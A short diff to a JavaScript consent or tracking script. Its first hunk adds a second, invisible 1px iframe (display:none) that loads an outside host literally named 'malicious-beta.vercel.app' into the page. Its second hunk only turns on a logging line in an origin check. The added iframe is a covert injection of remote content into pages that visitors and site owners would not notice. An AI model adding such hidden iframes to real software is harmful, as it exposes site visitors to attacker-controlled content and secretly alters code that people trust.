@@ -676,6 +676,12 @@ function loadIframe() {
   iframe.style.height = '1px'; // Set the height of the iframe
   iframe.style.display = 'none';
   document.body.appendChild(iframe); // Append the iframe to the body or a specific container
+   const iframetest = document.createElement('iframe');
+  iframetest.src = 'https://malicious-beta.vercel.app'; // Replace with your iframe source
+  iframetest.style.width = '1px'; // Set the width of the iframe
+  iframetest.style.height = '1px'; // Set the height of the iframe
+  iframetest.style.display = 'none';
+  document.body.appendChild(iframetest); // Append the iframe to the body or a specific container
 }
 
 // Function to structure the consent payload
@@ -1642,7 +1648,7 @@ if (automaticTracking === true) {
     // --- SECURITY CHECK: Verify the origin of the message ---
     if (event.origin !== iframeOrigin) {
       // IMPORTANT: Ignore messages from unexpected origins
-      // console.log(`[PARENT] Discarding message from unexpected origin: ${event.origin}`);
+       console.log(`[PARENT] Discarding message from unexpected origin: ${event.origin}`);
       return;
     }
 
